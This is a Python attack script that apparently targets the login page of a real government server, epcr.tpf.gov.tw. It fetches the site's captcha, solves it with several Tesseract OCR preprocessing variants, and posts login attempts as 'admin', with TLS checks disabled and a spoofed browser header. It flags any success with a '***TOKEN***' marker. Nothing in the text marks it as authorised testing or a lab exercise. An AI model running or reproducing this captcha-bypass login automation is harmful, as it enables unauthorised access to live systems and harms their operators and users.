import requests, json, urllib3, subprocess, time
from PIL import Image, ImageOps, ImageFilter, ImageEnhance
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"

def ocr(im):
    """多策略 OCR 返回候选列表"""
    cands=[]
    variants=["raw","thresh128","thresh160","invert","binv"]
    for v in variants:
        im2=im.copy()
        if v=="thresh128": im2=im.point(lambda p:255 if p<128 else 0)
        elif v=="thresh160": im2=im.point(lambda p:255 if p<160 else 0)
        elif v=="invert": im2=ImageOps.invert(im)
        elif v=="binv": im2=im.point(lambda p:255 if p<128 else 0)
        im2=im2.resize((800,280))
        im2.save(f"oc_{v}.png")
        for psm in [7,6,8]:
            try:
                out=subprocess.run(["tesseract",f"oc_{v}.png","stdout","--psm",str(psm),
                    "-c","tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"],
                    capture_output=True,text=True,timeout=10).stdout.strip()
                if out: cands.append((v,psm,out))
            except: pass
    return cands

def try_login(captcha_val):
    # 用同一个 session 下载 captcha 后登录
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    r=s.get(BASE+"/captcha",timeout=12)
    im=Image.open(__import__("io").BytesIO(r.content)).convert("L")
    cands=ocr(im)
    results=[]
    for v,psm,val in cands[:4]:
        rr=s.post(BASE+"/login",json={"username":"admin","password":"x","captcha":val,"domain":"AUTH_SERVER"},timeout=12)
        results.append((val,rr.status_code,rr.text[:40]))
    return cands, results

for attempt in range(3):
    cands,results=try_login(None)
    print(f"--- attempt {attempt} ---")
    print("  OCR cands:",[(c[0],c[2]) for c in cands[:6]])
    for val,code,t in results:
        mark=" ***TOKEN***" if code in (200,302) else ""
        print(f"  captcha={val!r:12s} -> {code} {t}{mark}")
    time.sleep(1)
print("DONE")
